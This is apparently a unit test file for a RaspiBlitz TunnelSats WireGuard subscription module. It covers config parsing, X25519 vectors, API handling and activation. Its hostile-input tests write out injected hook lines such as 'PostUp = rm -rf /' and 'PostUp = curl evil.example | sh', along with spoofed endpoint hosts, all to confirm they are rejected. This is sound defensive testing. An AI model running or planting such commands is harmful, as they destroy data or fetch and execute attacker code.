#!/usr/bin/python3
"""Unit tests for blitz.subscriptions.tunnelsats.py (stdlib only, no network).

The module is imported and its real functions run with injected http, run, clock and filesystem
root. Commands (internet.tunnelsats.sh, systemctl, blitz.conf.sh, ...) are recorded by a fake that
answers with real documents from fixtures/; one test routes the guard to the real bash functions.
Run: python3 -m unittest discover -s test/tunnelsats
"""

import binascii
import datetime
import hashlib
import importlib.util
import io
import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from unittest import mock

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.abspath(os.path.join(HERE, "..", ".."))
FIXTURES = os.path.join(HERE, "fixtures")
MODULE_PATH = os.path.join(REPO, "home.admin", "config.scripts", "blitz.subscriptions.tunnelsats.py")
ITS_PATH = os.path.join(REPO, "home.admin", "config.scripts", "internet.tunnelsats.sh")

_spec = importlib.util.spec_from_file_location("tunnelsats_module", MODULE_PATH)
mod = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(mod)
sys.path.insert(0, HERE)
import schema_check  # noqa: E402

ALICE_PRIV = "dwdtCnMYpX08FsFyUbJmRd9ML4frwJkqsXf7pR25LCo="
ALICE_PUB = "hSDwCYkwp1R0i33ctD73Wg2/Og0mOBr066SpjqqbTmo="
BOB_PUB = "3p7bfXt9wbTTW2HC7OQ1Nz+DQ8hbeGdNrfx+FG+IK08="
INVOCATION = "0123456789abcdef0123456789abcdef"
NOW = datetime.datetime(2026, 10, 14, 12, 0, 0, tzinfo=datetime.timezone.utc)
LND_FLAGS = ["--tor.skip-proxy-for-clearnet-targets", "--externalhosts=de2.tunnelsats.com:24556"]
with open(os.path.join(HERE, "schema", "module-envelope.schema.json")) as _handle:
    ENVELOPE = json.load(_handle)


def fixture(*parts, mode="r"):
    with open(os.path.join(FIXTURES, *parts), mode) as handle:
        return handle.read()


def fixture_json(*parts):
    return json.loads(fixture(*parts))


class FakeSystem:
    """Records every command and answers with scripted results; HTTP likewise."""

    def __init__(self, root):
        self.root = root
        self.calls = []
        self.http_calls = []
        self.http_responses = []
        self.sleeps = []
        self.notify_rc = 0
        self.real_guard = False
        self.its = {
            "audit lnd": (0, {"status": "clean", "eligible": True, "keys": [], "reason": None,
                              "not_eligible_reason": None}),
            "audit cl": (1, {"status": "unrepairable", "reason": "config_missing", "eligible": True, "keys": []}),
            "audit lnd --repair": (0, {"status": "clean", "keys": []}),
            "audit cl --repair": (0, {"status": "clean", "keys": []}),
            "detect": (0, fixture_json("tool", "detect_none.json")),
            "fetch": (0, {"contract": 1, "command": "its.fetch", "ok": True, "exit_code": 0, "errors": []}),
            "block-insert --check": (0, {"state": "absent", "changed": False}),
            "block-insert": (0, {"state": "present", "changed": True}),
            "block-remove": (0, {"state": "absent", "changed": True}),
            "block-status": (0, {"state": "present"}),
            "install": (0, fixture_json("tool", "install_ok.json")),
            "uninstall": (0, fixture_json("tool", "uninstall_disabled.json")),
            "verify --no-probe": (5, fixture_json("verify", "activating_tunnel_up.json")),
            "verify": (0, fixture_json("verify", "protected.json")),
            "status": (0, {"tool_hash": "current", "dev_override": "no"}),
            "guard": (0, {"decision": "hybrid", "reason": "ok"}),
            "tick-timer on": (0, "active"),
            "tick-timer off": (0, "absent"),
            "tick-timer status": (0, "absent"),
        }
        self.units = {
            "lnd.service": {"ActiveState": "active", "InvocationID": INVOCATION, "MainPID": "4242",
                            "ControlGroup": "/tunnelsats.slice/lnd.service",
                            "FragmentPath": "/etc/systemd/system/lnd.service", "NeedDaemonReload": "no"},
            "lightningd.service": {"ActiveState": "inactive", "InvocationID": "", "MainPID": "0", "ControlGroup": "",
                                   "FragmentPath": "/etc/systemd/system/lightningd.service", "NeedDaemonReload": "no"},
        }
        # LND resolves externalhosts and announces the resolved address (1.2.3.4 = endpoint.ipv4)
        self.getinfo = {"uris": ["0280a@1.2.3.4:24556", "0280a@exampleonion.onion:9735"]}
        self.wg = {"latest-handshakes": "%s\t%d\n" % (BOB_PUB, int(NOW.timestamp()) - 30),
                   "transfer": "%s\t1000\t2000\n" % BOB_PUB}

    # -- commands ---------------------------------------------------------------------------
    def its_key(self, args):
        tokens = [a for a in args if a != "--json"]
        if tokens and tokens[0] in ("install", "guard"):
            return tokens[0]
        return " ".join(tokens)

    def run(self, argv, timeout=60, interactive=False):
        self.calls.append(list(argv))
        prog = argv[0]
        if prog == mod.BLITZ_CONF and argv[1] == "set":
            self.conf_set(argv[2], argv[3])
            return 0, "", ""
        if prog == mod.ITS:
            if self.real_guard and argv[1] == "guard":
                return self.run_real_guard(argv[2:])
            key = self.its_key(argv[1:])
            answer = self.its.get(key, (127, ""))
            if isinstance(answer, list):
                answer = answer.pop(0) if len(answer) > 1 else answer[0]
            rc, doc = answer
            return rc, doc if isinstance(doc, str) else json.dumps(doc), ""
        if prog == "systemctl":
            if argv[1] == "show":
                unit = argv[-1]
                props = [argv[i + 1] for i in range(len(argv)) if argv[i] == "-p"]
                values = self.units.get(unit, {})
                return 0, "".join("%s=%s\n" % (p, values.get(p, "")) for p in props), ""
            return 0, "", ""
        if prog == "install":
            shutil.copy(os.path.join(REPO, "home.admin", "assets", "lnd.service"),
                        os.path.join(self.root, argv[-1].lstrip("/")))
            return 0, "", ""
        if prog == "wg":
            return 0, self.wg.get(argv[3], ""), ""
        if prog == "sudo":
            return (0, json.dumps(self.getinfo), "") if self.getinfo is not None else (1, "", "locked")
        if prog == mod.NOTIFY:
            return self.notify_rc, "", ""
        if prog == mod.CL_INSTALL_SERVICE:
            return 0, "", ""
        return 127, "", "unexpected"

    def run_real_guard(self, args):
        """The real start guard functions of internet.tunnelsats.sh against this fixture tree."""
        root = self.root
        tool = os.path.join(root, "tool.sh")
        with open(tool, "w") as handle:
            handle.write("#!/bin/bash\ncat '%s'\nexit 0\n" % os.path.join(FIXTURES, "verify", "protected.json"))
        os.chmod(tool, 0o755)
        script = (
            'source "$ITS"; TS_RB_CONF="$R/mnt/hdd/app-data/raspiblitz.conf"; TS_RB_APPDATA="$R/mnt/hdd/app-data"; '
            'TS_RB_RUN_DIR="$R/run/tunnelsats"; TS_RB_TOOL="$R/tool.sh"; TS_RB_ROOT_UID="$(id -u)"; '
            'TS_RB_CLN_DIR="$R/cln"; TS_RB_BOOT_ID="$R/boot_id"; '
            'TS_ACCEPTED_SHA256=("$(sha256sum "$TS_RB_TOOL" | cut -d" " -f1)"); its_cmd_guard "$@"')
        env = dict(os.environ, ITS=ITS_PATH, R=root, LC_ALL="C")
        proc = subprocess.run(["bash", "-c", script, "_"] + list(args), capture_output=True, text=True,
                              env=env, timeout=60, check=False)
        return proc.returncode, proc.stdout, proc.stderr

    def conf_set(self, key, value):
        path = os.path.join(self.root, mod.RB_CONF.lstrip("/"))
        with open(path) as handle:
            lines = [line for line in handle.read().splitlines() if not line.startswith(key + "=")]
        lines.append("%s=%s" % (key, value))
        with open(path, "w") as handle:
            handle.write("\n".join(lines) + "\n")

    def calls_of(self, prog, *prefix):
        return [c for c in self.calls if c[0] == prog and c[1:1 + len(prefix)] == list(prefix)]

    def index_of(self, prog, *prefix):
        for i, call in enumerate(self.calls):
            if call[0] == prog and call[1:1 + len(prefix)] == list(prefix):
                return i
        return -1

    # -- http -------------------------------------------------------------------------------
    def http(self, url, payload):
        self.http_calls.append((url, payload))
        answer = self.http_responses.pop(0) if self.http_responses else (200, {}, fixture("api", "status_enabled.json").encode())
        if isinstance(answer, Exception):
            raise answer
        return answer

    def sleep(self, seconds):
        self.sleeps.append(seconds)


class ModuleTestCase(unittest.TestCase):
    def setUp(self):
        self.old_umask = os.umask(0o022)
        self.root = tempfile.mkdtemp(prefix="ts-module-")
        for d in ("mnt/hdd/app-data/lnd", "run/tunnelsats", "etc/systemd/system", "etc/wireguard", "proc/4242",
                  "cln"):
            os.makedirs(os.path.join(self.root, d), exist_ok=True)
        self.write("mnt/hdd/app-data/raspiblitz.conf",
                   "lightning=lnd\nlnd=on\nchain=main\nrunBehindTor=on\nnotify=off\n")
        shutil.copy(os.path.join(REPO, "home.admin", "assets", "lnd.service"),
                    os.path.join(self.root, "etc/systemd/system/lnd.service"))
        shutil.copy(os.path.join(FIXTURES, "conf", "lnd.conf"), os.path.join(self.root, "mnt/hdd/app-data/lnd/lnd.conf"))
        self.write("boot_id", "0f1e2d3c-4b5a-6978-8796-a5b4c3d2e1f0\n")
        self.cmdline(4242, ["/usr/local/bin/lnd", "--configfile=/mnt/hdd/app-data/lnd/lnd.conf"] + LND_FLAGS)
        self.fake = FakeSystem(self.root)
        self.logs = []
        self.deps = mod.Deps(root=self.root, http=self.fake.http, run=self.fake.run, clock=lambda: NOW,
                             sleep=self.fake.sleep, is_root=lambda: True, log=self.logs.append)
        self.import_file = os.path.join(FIXTURES, "import", "website.conf")

    def tearDown(self):
        os.umask(self.old_umask)
        shutil.rmtree(self.root, ignore_errors=True)

    # -- helpers ----------------------------------------------------------------------------
    def write(self, rel, text):
        path = os.path.join(self.root, rel)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as handle:
            handle.write(text)
        return path

    def cmdline(self, pid, args, ppid=1, comm=None):
        self.write("proc/%d/cmdline" % pid, "\0".join(args) + "\0")
        self.write("proc/%d/stat" % pid, "%d (%s) S %d 0 0\n" % (pid, comm or os.path.basename(args[0]), ppid))

    def record(self, decision="hybrid", reason="ok", invocation=INVOCATION, base="lnd", ipv4=None):
        doc = {"schema": "raspiblitz.tunnelsats.guard/1", "unit": base + ".service", "impl": "lnd",
               "chain": "mainnet", "decision": decision, "reason": reason, "detail": "",
               "invocation_id": invocation, "decided_at": "2026-10-14T11:00:00Z",
               "announce": {"host": "de2.tunnelsats.com", "ipv4": ipv4, "port": 24556}}
        self.write("run/tunnelsats/guard-%s.json" % base, json.dumps(doc))

    def store(self, mode="managed", impl="lnd", **extra):
        cfg = mod.parse_wg_config(fixture("import", "website.conf", mode="rb"))
        data = mod.validate_status(fixture_json("api", "status_enabled.json"))
        return mod.store_subscription(self.deps, cfg, mode, impl, "confirmed", data, extra or None)

    def activate_conf(self, impl="lnd"):
        self.fake.conf_set("tunnelsats", "on")
        self.fake.conf_set("tunnelsatsImpl", impl)

    def run_verb(self, *argv):
        out = io.StringIO()
        rc = mod.main(list(argv) + ["--json"], deps=self.deps, out=out)
        doc = json.loads(out.getvalue())
        self.assertEqual([], schema_check.validate(doc, ENVELOPE), doc)
        self.assertEqual(rc, doc["exit_code"])
        self.assertNotIn(ALICE_PRIV, out.getvalue())
        self.assertFalse(any(ALICE_PRIV in line for line in self.logs))
        self.assertFalse(any(ALICE_PRIV in " ".join(call) for call in self.fake.calls))
        self.docs = getattr(self, "docs", []) + [doc]
        return doc

    def path(self, rel):
        return os.path.join(self.root, rel.lstrip("/"))

    def read_json(self, rel):
        with open(self.path(rel)) as handle:
            return json.load(handle)

    def read_bytes(self, rel):
        with open(self.path(rel), "rb") as handle:
            return handle.read()


# ------------------------------------------------------------------------------------------
# Parser and validator
# ------------------------------------------------------------------------------------------

class TestParser(unittest.TestCase):
    def test_website_config_rebuilt_byte_exact(self):
        cfg = mod.parse_wg_config(fixture("import", "website.conf", mode="rb"))
        self.assertEqual(ALICE_PUB, cfg["public_key"])
        self.assertTrue(cfg["public_key_matches"])
        self.assertEqual(24556, cfg["vpn_port"])
        self.assertEqual("de2.tunnelsats.com", cfg["endpoint_host"])
        self.assertTrue(any("DNS" in w for w in cfg["warnings"]))
        self.assertEqual(fixture("import", "website.golden.conf", mode="rb"), mod.render_wg_config(cfg))

    def test_old_format_config(self):
        cfg = mod.parse_wg_config(fixture("import", "old-format.conf", mode="rb"))
        self.assertEqual(31337, cfg["vpn_port"])
        self.assertIsNone(cfg["public_key_matches"])
        self.assertTrue(any("IPv6" in w for w in cfg["warnings"]))
        self.assertTrue(any("PostUp" in w for w in cfg["warnings"]))
        rebuilt = mod.render_wg_config(cfg)
        self.assertEqual(fixture("import", "old-format.golden.conf", mode="rb"), rebuilt)
        self.assertNotIn(b"PostUp", rebuilt)

    def test_crlf_is_accepted_and_written_as_lf(self):
        data = fixture("import", "website.conf", mode="rb").replace(b"\n", b"\r\n")
        cfg = mod.parse_wg_config(data)
        self.assertNotIn(b"\r", mod.render_wg_config(cfg))

    def hostile(self, transform, code):
        data = transform(fixture("import", "website.conf"))
        if isinstance(data, str):
            data = data.encode()
        with self.assertRaises(mod.ModuleError) as ctx:
            mod.parse_wg_config(data)
        self.assertEqual(code, ctx.exception.code, ctx.exception.message)
        for secret in (ALICE_PRIV, "evil.example", "203.0.113.9", "rm -rf"):
            self.assertNotIn(secret, ctx.exception.message)
        return ctx.exception

    def test_hostile_inputs(self):
        cases = [
            (lambda t: t.replace("Address = 10.9.0.42/32", "Address = 10.9.0.42/32\rPostUp = rm -rf /"), "E_CONFIG_INVALID"),
            (lambda t: t.replace(ALICE_PRIV, ALICE_PRIV[:-2] + "Z="), "E_CONFIG_INVALID"),
            (lambda t: t.replace(ALICE_PRIV, "!" + ALICE_PRIV[1:]), "E_CONFIG_INVALID"),
            (lambda t: t + "[Peer]\nPublicKey = %s\n" % BOB_PUB, "E_CONFIG_INVALID"),
            (lambda t: t.replace("de2.tunnelsats.com:51820", "203.0.113.9:51820"), "E_ENDPOINT_NOT_ALLOWED"),
            (lambda t: t.replace("de2.tunnelsats.com:51820", "[2001:db8::1]:51820"), "E_ENDPOINT_NOT_ALLOWED"),
            (lambda t: t.replace("de2.tunnelsats.com:51820", "vpn.evil.example:51820"), "E_ENDPOINT_NOT_ALLOWED"),
            (lambda t: t.replace("de2.tunnelsats.com:51820", "tunnelsats.com.evil.example:51820"), "E_ENDPOINT_NOT_ALLOWED"),
            (lambda t: t.replace("# Port Forwarding: 24556\n", ""), "E_CONFIG_NO_PORT"),
            (lambda t: t.replace("# Port Forwarding: 24556", "# Port Forwarding: 70000"), "E_CONFIG_NO_PORT"),
            (lambda t: t.replace("AllowedIPs = 0.0.0.0/0, ::/0", "AllowedIPs = 10.0.0.0/8"), "E_CONFIG_INVALID"),
            (lambda t: t.replace("Address = 10.9.0.42/32", "Address = 192.168.1.5/24"), "E_CONFIG_INVALID"),
            (lambda t: t.replace("Address = 10.9.0.42/32", "Address = fd00::5/64"), "E_CONFIG_INVALID"),
            (lambda t: t.encode() + b"\x00", "E_CONFIG_INVALID"),
            (lambda t: t + "#" + "x" * 17000 + "\n", "E_CONFIG_INVALID"),
            (lambda t: t.replace("DNS = 8.8.8.8", "Address = 10.9.0.43/32"), "E_CONFIG_INVALID"),
            (lambda t: t.replace("[Peer]", "[Peer]\n[Other]"), "E_CONFIG_INVALID"),
            (lambda t: t.replace("PrivateKey = %s\n" % ALICE_PRIV, ""), "E_CONFIG_INVALID"),
            (lambda t: "Endpoint = de2.tunnelsats.com:1\n" + t, "E_CONFIG_INVALID"),
            (lambda t: t.replace("Address", "Address\x1b[31m"), "E_CONFIG_INVALID"),
            (lambda t: t.encode().replace(b"Address", b"Addr\xffess"), "E_CONFIG_INVALID"),
            (lambda t: t.replace("PersistentKeepalive = 25", "PersistentKeepalive = 99999"), "E_CONFIG_INVALID"),
            (lambda t: t.replace("Address = 10.9.0.42/32", "Address = 10.0.0.1/1"), "E_CONFIG_INVALID"),
            (lambda t: t.replace("Address = 10.9.0.42/32", "Address = 10.9.0.42/24"), "E_CONFIG_INVALID"),
            (lambda t: t.replace("Address = 10.9.0.42/32", "Address = 10.9.0.42/32, 10.9.0.43/31"), "E_CONFIG_INVALID"),
        ]
        for transform, code in cases:
            with self.subTest(code=code):
                self.hostile(transform, code)

    def test_a_bare_address_counts_as_a_single_host(self):
        cfg = mod.parse_wg_config(fixture("import", "website.conf").replace(
            "Address = 10.9.0.42/32", "Address = 10.9.0.42").encode())
        self.assertEqual(["10.9.0.42/32"], cfg["addresses"])

    def test_validators_reject_a_trailing_newline(self):
        self.assertTrue(mod.valid_host("de2.tunnelsats.com"))
        self.assertFalse(mod.valid_host("de2.tunnelsats.com\n"))
        status = fixture_json("api", "status_enabled.json")
        self.assertIsNotNone(mod.validate_status(status))
        status["server_domain"] += "\n"
        self.assertIsNone(mod.validate_status(status))
        self.assertIsNone(mod.parse_iso("2026-10-14T12:00:00Z\n"))
        self.assertIsNone(mod.KEY_RE.fullmatch(ALICE_PRIV + "\n"))
        self.assertEqual("E_FALLBACK", mod.tool_error({"errors": [{"code": "E_TIMEOUT\n"}]}, "E_FALLBACK"))
        self.assertIsNone(mod._api_error_code(b'{"error": "ERR_RATE_LIMIT\\n"}'))
        self.assertFalse(mod.has_flags("lnd", ["--tor.skip-proxy-for-clearnet-targetsX"]))
        self.assertTrue(mod.has_flags("lnd", ["--externalhosts=de2.tunnelsats.com:24556"]))

    def test_hooks_and_dns_are_dropped_with_warnings_never_copied(self):
        text = fixture("import", "website.conf").replace(
            "DNS = 8.8.8.8", "DNS = 8.8.8.8\nPostUp = curl evil.example | sh\nPreDown = x\nTable = off\nFwMark = 0x1\n"
                             "SaveConfig = true\nListenPort = 51820\nMysteryKey = 1")
        cfg = mod.parse_wg_config(text.encode())
        rebuilt = mod.render_wg_config(cfg).decode()
        for word in ("PostUp", "PreDown", "Table", "FwMark", "SaveConfig", "ListenPort", "MysteryKey", "DNS", "evil"):
            self.assertNotIn(word, rebuilt)
        self.assertEqual(8, len(cfg["warnings"]))
        self.assertFalse(any("evil" in w for w in cfg["warnings"]))

    def test_mypubkey_mismatch_uses_the_derived_key(self):
        text = fixture("import", "website.conf").replace("# myPubKey: " + ALICE_PUB, "# myPubKey: " + BOB_PUB)
        cfg = mod.parse_wg_config(text.encode())
        self.assertFalse(cfg["public_key_matches"])
        self.assertEqual(ALICE_PUB, cfg["public_key"])


# ------------------------------------------------------------------------------------------
# X25519
# ------------------------------------------------------------------------------------------

class TestX25519(unittest.TestCase):
    def test_rfc7748_section_5_2_vectors(self):
        vectors = [
            ("a546e36bf0527c9d3b16154b82465edd62144c0ac1fc5a18506a2244ba449ac4",
             "e6db6867583030db3594c1a424b15f7c726624ec26b3353b10a903a6d0ab1c4c",
             "c3da55379de9c6908e94ea4df28d084f32eccf03491c71f754b4075577a28552"),
            ("4b66e9d4d1b4673c5ad22691957d6af5c11b6421e0ea01d42ca4169e7918ba0d",
             "e5210f12786811d3f4b7959d0538ae2c31dbe7106fc03c3efc4cd549c715a493",
             "95cbde9476e8907d7aade45cb4b873f88b595a68799fa152e6f8f7647aac7957"),
        ]
        for k, u, out in vectors:
            self.assertEqual(out, binascii.hexlify(mod.x25519(binascii.unhexlify(k), binascii.unhexlify(u))).decode())

    def test_rfc7748_section_6_1_key_pairs_and_shared_secret(self):
        alice = binascii.unhexlify("77076d0a7318a57d3c16c17251b26645df4c2f87ebc0992ab177fba51db92c2a")
        bob = binascii.unhexlify("5dab087e624a8a4b79e17f8b83800ee66f3bb1292618b6fd1c2f8b27ff88e0eb")
        base = (9).to_bytes(32, "little")
        alice_pub = mod.x25519(alice, base)
        bob_pub = mod.x25519(bob, base)
        self.assertEqual("8520f0098930a754748b7ddcb43ef75a0dbf3a0d26381af4eba4a98eaa9b4e6a", alice_pub.hex())
        self.assertEqual("de9edb7d7b7dc1b4d35b61c2ece435373f8343c85b78674dadfc7e146f882b4f", bob_pub.hex())
        shared = "4a5d9d5ba4ce2de1728e3bf480350f25e07e21c947d19e3376f09b3c1e161742"
        self.assertEqual(shared, mod.x25519(alice, bob_pub).hex())
        self.assertEqual(shared, mod.x25519(bob, alice_pub).hex())
        self.assertEqual(ALICE_PUB, mod.public_key_of(ALICE_PRIV))

    def test_wg_pubkey_pair(self):
        # generated with: wg genkey | tee priv | wg pubkey (a throwaway key, no subscription)
        self.assertEqual("kBqT3q5CUU8M6X1zEzqerXWWyW/UDZDDez7mGT6leF8=",
                         mod.public_key_of("4Ll6wDUceJ98qxImrs3HduHQu0bNxERCWnImQhhWCWs="))


# ------------------------------------------------------------------------------------------
# API client
# ------------------------------------------------------------------------------------------

class TestApi(ModuleTestCase):
    def ask(self, *responses):
        self.fake.http_responses = list(responses)
        return mod.api_status(self.deps, ALICE_PUB)

    def body(self, name):
        return fixture("api", name).encode()

    def test_outcomes(self):
        outcome, data, _ = self.ask((200, {}, self.body("status_enabled.json")))
        self.assertEqual("confirmed", outcome)
        self.assertEqual({"expiry": "2026-12-01T00:00:00.000Z", "bandwidth_used_gb": 12.34, "bandwidth_limit_gb": 100,
                          "resets_this_month": 0, "max_resets_per_month": 2, "peer_status": "enabled",
                          "server_domain": "de2.tunnelsats.com", "vpn_port": 24556,
                          "last_synced_at": "2026-10-14T11:00:00.000Z"}, data)
        self.assertEqual("disabled", self.ask((200, {}, self.body("status_disabled.json")))[1]["peer_status"])
        self.assertIsNone(self.ask((200, {}, self.body("status_port_null.json")))[1]["vpn_port"])
        self.assertEqual("unknown_key", self.ask((404, {}, self.body("error_not_found.json")))[0])
        self.assertEqual("failed", self.ask((404, {}, b"<html>not found</html>"))[0])
        self.assertEqual("migration", self.ask((403, {}, self.body("error_migration.json")))[0])
        self.assertEqual("failed", self.ask((429, {"retry-after": "42"}, self.body("error_rate_limit.json")))[0])
        self.assertEqual("failed", self.ask((500, {}, self.body("error_internal.json")))[0])
        self.assertEqual("failed", self.ask(OSError("timed out"))[0])
        self.assertEqual("invalid", self.ask((200, {}, b"{not json"))[0])
        self.assertEqual("invalid", self.ask((200, {}, b"x" * 70000))[0])
        self.assertEqual("invalid", self.ask((400, {}, b'{"error":"ERR_INVALID_INPUT","message":"x"}'))[0])
        self.assertEqual(API_URL, self.fake.http_calls[0][0])
        self.assertEqual({"wgPublicKey": ALICE_PUB}, self.fake.http_calls[0][1])

    def test_503_retries_once_after_retry_after(self):
        outcome, _data, _ = self.ask((503, {"retry-after": "7"}, self.body("error_unavailable.json")),
                                     (200, {}, self.body("status_enabled.json")))
        self.assertEqual("confirmed", outcome)
        self.assertEqual([7], self.fake.sleeps)
        outcome, _data, _ = self.ask((503, {"retry-after": "500"}, b"{}"), (503, {}, b"{}"))
        self.assertEqual("failed", outcome)
        self.assertEqual([7, 60], self.fake.sleeps)

    def test_schema_violations_are_invalid(self):
        good = fixture_json("api", "status_enabled.json")
        edits = [("expiry", "tomorrow"), ("bandwidth_used_gb", -1), ("bandwidth_used_gb", "12"),
                 ("bandwidth_limit_gb", True), ("bandwidth_resets_this_month", 1.5), ("max_resets_per_month", -2),
                 ("status", "active"), ("server_domain", "evil.example"), ("server_domain", "x.tunnelsats.com.evil"),
                 ("vpn_port", 0), ("vpn_port", 70000), ("vpn_port", "24556"), ("last_synced_at", 5)]
        for key, value in edits:
            with self.subTest(key=key, value=value):
                bad = dict(good, **{key: value})
                self.assertEqual("invalid", self.ask((200, {}, json.dumps(bad).encode()))[0])
        self.assertEqual("invalid", self.ask((200, {}, b"[]"))[0])

    def test_bodies_are_never_logged(self):
        self.ask((200, {}, b'{"first-marker": 1}'))
        self.ask((500, {}, b'{"error":"ERR_INTERNAL_ERROR","message":"body-marker"}'))
        self.assertFalse(any("marker" in line for line in self.logs))

    def test_lock_keeps_the_run_directory_readable(self):
        shutil.rmtree(self.path("run/tunnelsats"))
        os.umask(0o077)
        with mod.Lock(self.deps, wait=0):
            pass
        self.assertEqual(0o755, os.stat(self.path("run/tunnelsats")).st_mode & 0o777)


API_URL = "https://tunnelsats.com/api/public/v1/subscription/status"


# ------------------------------------------------------------------------------------------
# detect and import (activation)
# ------------------------------------------------------------------------------------------

class TestDetect(ModuleTestCase):
    def test_eligible_node(self):
        doc = self.run_verb("detect")
        self.assertEqual(0, doc["exit_code"])
        self.assertTrue(doc["eligible"])
        self.assertEqual("lnd", doc["impl"])
        self.assertEqual("none", doc["existing_install"]["kind"])
        self.assertEqual({"wireguard_tools": "present", "nft": "present", "systemd": "present",
                          "cgroup_v2": "mounted"}, doc["capabilities"])

    def test_not_eligible_reasons(self):
        self.fake.conf_set("runBehindTor", "off")
        self.fake.conf_set("lndPort", "9736")
        self.fake.its["audit lnd"] = (0, {"status": "clean", "eligible": False, "not_eligible_reason": "nat"})
        self.fake.its["detect"] = (0, fixture_json("tool", "detect_legacy.json"))
        doc = self.run_verb("detect")
        self.assertEqual(3, doc["exit_code"])
        self.assertEqual(["tor_required", "lnd_port", "not_eligible:nat", "legacy_install"], doc["reasons"])
        self.assertTrue(doc["adopt_available"])

    def test_lnd_and_cl_on_tunnels_lnd_and_refuses_cl(self):
        self.fake.conf_set("cl", "on")
        self.assertEqual("lnd", self.run_verb("detect")["impl"])
        doc = self.run_verb("import", "--file", self.import_file, "--impl", "cl")
        self.assertEqual(14, doc["exit_code"])
        self.assertEqual("E_PORT_CONFLICT", doc["errors"][0]["code"])


class TestImport(ModuleTestCase):
    def test_activation_order_and_custody(self):
        self.fake.units["lnd.service"]["ActiveState"] = "inactive"
        doc = self.run_verb("import", "--file", self.import_file)
        self.assertIn(doc["exit_code"], (0, 4, 5))
        self.assertEqual("confirmed", doc["sync"]["outcome"])
        self.assertEqual(ALICE_PUB, doc["public_key"])
        f = self.fake
        check = f.index_of(mod.ITS, "block-insert", "--check")
        flag_on = f.calls.index([mod.BLITZ_CONF, "set", "tunnelsats", "on"])
        impl_set = f.calls.index([mod.BLITZ_CONF, "set", "tunnelsatsImpl", "lnd"])
        install = f.index_of(mod.ITS, "install")
        block = f.calls.index([mod.ITS, "block-insert", "--json"])
        timer = f.calls.index([mod.ITS, "tick-timer", "on"])
        self.assertLess(f.index_of(mod.ITS, "fetch"), check)
        self.assertTrue(check < impl_set < flag_on < install < block < timer)
        self.assertEqual([mod.ITS, "install", "--impl", "lnd", "--json"], f.calls[install])
        self.assertEqual([], f.calls_of("systemctl", "start"))
        self.assertEqual([], f.calls_of("systemctl", "restart"))
        self.assertEqual({"fetch": "ok", "unit_regenerated": False, "install": "ok", "ln_restarted": True,
                          "restore_block": "present", "tick_timer": "active"}, doc["activation"])
        self.assertEqual(0o600, os.stat(self.path(mod.CONF_FILE)).st_mode & 0o777)
        self.assertEqual(0o600, os.stat(self.path(mod.STATE_FILE)).st_mode & 0o777)
        self.assertEqual(0o700, os.stat(self.path(mod.STATE_DIR)).st_mode & 0o777)
        self.assertEqual(fixture("import", "website.golden.conf", mode="rb"), self.read_bytes(mod.CONF_FILE))
        state = self.read_json(mod.STATE_FILE)
        self.assertEqual(("managed", "lnd", ALICE_PUB, 24556), (state["mode"], state["impl"], state["public_key"],
                                                                state["vpn_port"]))
        self.assertNotIn(ALICE_PRIV, json.dumps(state))

    def test_guard_less_unit_is_regenerated_before_the_flag(self):
        self.write("etc/systemd/system/lnd.service", "[Service]\nExecStart=/usr/local/bin/lnd\n")
        doc = self.run_verb("import", "--file", self.import_file)
        self.assertTrue(doc["activation"]["unit_regenerated"])
        regen = self.fake.calls.index(["install", "-m", "0644", mod.LND_ASSET, "/etc/systemd/system/lnd.service"])
        reload_ = self.fake.calls.index(["systemctl", "daemon-reload"])
        flag_on = self.fake.calls.index([mod.BLITZ_CONF, "set", "tunnelsats", "on"])
        self.assertTrue(regen < reload_ < flag_on)

    def test_failed_install_switches_the_flag_off_and_keeps_the_config(self):
        self.fake.its["install"] = (6, fixture_json("tool", "install_capability.json"))
        doc = self.run_verb("import", "--file", self.import_file)
        self.assertEqual(3, doc["exit_code"])
        self.assertEqual("E_CAPABILITY_MISSING", doc["errors"][0]["code"])
        install = self.fake.index_of(mod.ITS, "install")
        self.assertEqual([mod.BLITZ_CONF, "set", "tunnelsats", "off"], self.fake.calls[install + 1])
        self.assertEqual("off", mod.read_rb_conf(self.deps)["tunnelsats"])
        self.assertTrue(os.path.exists(self.path(mod.CONF_FILE)))
        self.assertEqual(-1, self.fake.index_of(mod.ITS, "block-insert", "--json"))
        refused = (7, fixture_json("tool", "install_managed_present.json"))
        self.fake.its["install"] = refused
        self.assertEqual(14, self.run_verb("import", "--file", self.import_file)["exit_code"])

    def test_unknown_key_stores_nothing(self):
        self.fake.http_responses = [(404, {}, fixture("api", "error_not_found.json").encode())]
        doc = self.run_verb("import", "--file", self.import_file)
        self.assertEqual((14, "E_UNKNOWN_KEY"), (doc["exit_code"], doc["errors"][0]["code"]))
        self.assertFalse(os.path.exists(self.path(mod.STATE_DIR)))
        self.assertEqual([], self.fake.calls_of(mod.BLITZ_CONF))

    def test_api_failure_needs_confirmation(self):
        self.fake.http_responses = [OSError("down")]
        doc = self.run_verb("import", "--file", self.import_file)
        self.assertEqual((13, "E_API_UNAVAILABLE"), (doc["exit_code"], doc["errors"][0]["code"]))
        self.assertFalse(os.path.exists(self.path(mod.CONF_FILE)))
        self.fake.http_responses = [OSError("down")]
        doc = self.run_verb("import", "--file", self.import_file, "--yes")
        self.assertEqual("failed", doc["sync"]["outcome"])
        self.assertTrue(os.path.exists(self.path(mod.CONF_FILE)))

    def test_dry_run_writes_nothing(self):
        doc = self.run_verb("import", "--file", self.import_file, "--dry-run")
        self.assertEqual(0, doc["exit_code"])
        self.assertTrue(doc["valid"] and doc["dry_run"] and doc["public_key_matches"])
        self.assertEqual("confirmed", doc["sync"]["outcome"])
        self.assertFalse(os.path.exists(self.path(mod.STATE_FILE)))
        self.assertEqual([], self.fake.calls_of(mod.BLITZ_CONF))
        self.assertEqual(-1, self.fake.index_of(mod.ITS, "install"))

    def test_another_stored_key_is_refused_and_ineligible_nodes_stop_early(self):
        self.store()
        text = fixture("import", "website.conf").replace(ALICE_PRIV, "4Ll6wDUceJ98qxImrs3HduHQu0bNxERCWnImQhhWCWs=")
        other = self.write("other.conf", text)
        doc = self.run_verb("import", "--file", other)
        self.assertEqual((14, "E_ALREADY_CONFIGURED"), (doc["exit_code"], doc["errors"][0]["code"]))
        shutil.rmtree(self.path(mod.STATE_DIR))
        self.fake.conf_set("runBehindTor", "off")
        doc = self.run_verb("import", "--file", self.import_file)
